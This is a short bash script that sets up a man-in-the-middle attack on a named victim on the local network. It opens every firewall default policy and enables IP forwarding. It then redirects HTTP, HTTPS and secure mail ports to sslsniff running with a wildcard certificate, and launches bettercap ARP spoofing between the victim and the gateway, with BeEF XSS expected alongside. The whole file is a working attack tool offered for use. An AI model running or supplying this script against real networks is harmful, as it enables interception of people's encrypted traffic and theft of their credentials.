#!/bin/bash

RED='\033[0;31m'
GREY='\033[1;35m'
BLUE='\033[1;29m'
GREEN='\033[1;28m'
TABLES=( $(sudo cat /proc/net/ip_tables_names) )

if [[ $# -lt 4 ]] ; then
  echo -e "${RED} Missing arguments. \n\n USAGE: sudo ./mitmf.sh interface gateway victim logdir"
  echo -e "${RED}================"
  echo -e "Requires: Ruby 2.3.0[gems=>[bettercap]], iptables"
  echo -e "Required ports: Ruby 2.3.0[gems=>[bettercap]], iptables"
  echo -e "Required background process: Beef XSS running on 127.0.0.1:3000"
  exit 1
fi

echo "Preparing for attack. Disabling Firewall"

iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT

echo "Setting up IP FORWARD"
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "Setting up SSLSNIFF rules to port 6666"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 6666
iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-ports 6666
iptables -t nat -A PREROUTING -p tcp --destination-port 8083 -j REDIRECT --to-ports 6666
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 6666
iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports 6666
iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports 6666

echo "Loading RVM"
source /usr/local/rvm/scripts/rvm
rvm use 2.3.0

echo "Making logdir"
mkdir ${4}

echo "Starting SSLSNIFF"
cd /usr/share/sslsniff/certs/certs
killall sslsniff
sslsniff -a -l 6666 -w "${4}/sslsniff.log" -m IPSCACLASEA1.crt -c wildcard &

echo "SSL SNIFF RUNNING IN BG. PLEASE CLOSE WITH KILL WHEN DONE OR YOU WILL GET CONFLICTS"
echo "-------"

echo "Starting bettercap"
bettercap -I ${1} -O "${4}/bettercap.log" -S ARP -X --gateway ${2} --target ${3}
 	